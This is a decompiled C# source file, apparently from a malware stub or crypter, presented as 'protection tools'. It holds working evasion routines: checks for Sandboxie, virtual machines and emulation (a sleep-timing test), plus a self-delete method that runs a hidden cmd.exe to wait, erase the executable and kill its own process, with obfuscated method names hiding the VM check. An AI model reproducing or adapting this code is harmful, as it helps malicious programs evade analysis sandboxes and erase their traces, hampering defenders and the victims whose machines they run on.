using System;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;

namespace AuraLLC.ProtectionTools
{
	// Token: 0x02000006 RID: 6
	internal static class MainModule
	{
		// Token: 0x0600000E RID: 14
		[DllImport("kernel32")]
		private static extern int SetProcessWorkingSetSize([In] IntPtr intptr_0, [In] int int_0, [In] int int_1);

		// Token: 0x0600000F RID: 15 RVA: 0x000022BB File Offset: 0x000004BB
		internal static bool IsSandboxie()
		{
			return Sandboxie.IsSandboxie();
		}

		// Token: 0x06000010 RID: 16 RVA: 0x000022C2 File Offset: 0x000004C2
		internal static bool IsVM()
		{
			return CommonAcl.SecurityDocumentElement();
		}

		// Token: 0x06000011 RID: 17 RVA: 0x000033E4 File Offset: 0x000015E4
		internal static bool IsEmulation()
		{
			int num = new Random().Next(3000, 10000);
			DateTime now = DateTime.Now;
			Thread.Sleep(num);
			return (DateTime.Now - now).TotalMilliseconds < (double)num;
		}

		// Token: 0x06000012 RID: 18 RVA: 0x0000342C File Offset: 0x0000162C
		internal static void SelfDelete()
		{
			Process process = Process.Start(new ProcessStartInfo("cmd.exe", "/C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del \"" + Assembly.GetExecutingAssembly().Location + "\"")
			{
				WindowStyle = ProcessWindowStyle.Hidden
			});
			if (process != null)
			{
				process.Dispose();
			}
			Process.GetCurrentProcess().Kill();
		}

		// Token: 0x06000013 RID: 19 RVA: 0x00003480 File Offset: 0x00001680
		public static void WellKnownSidType()
		{
			IntPtr handle = Process.GetCurrentProcess().Handle;
			for (;;)
			{
				Thread.Sleep(16384);
				GC.Collect();
				GC.WaitForPendingFinalizers();
				if (Environment.OSVersion.Platform == PlatformID.Win32NT)
				{
					MainModule.SetProcessWorkingSetSize(handle, -1, -1);
				}
			}
		}
	}
}
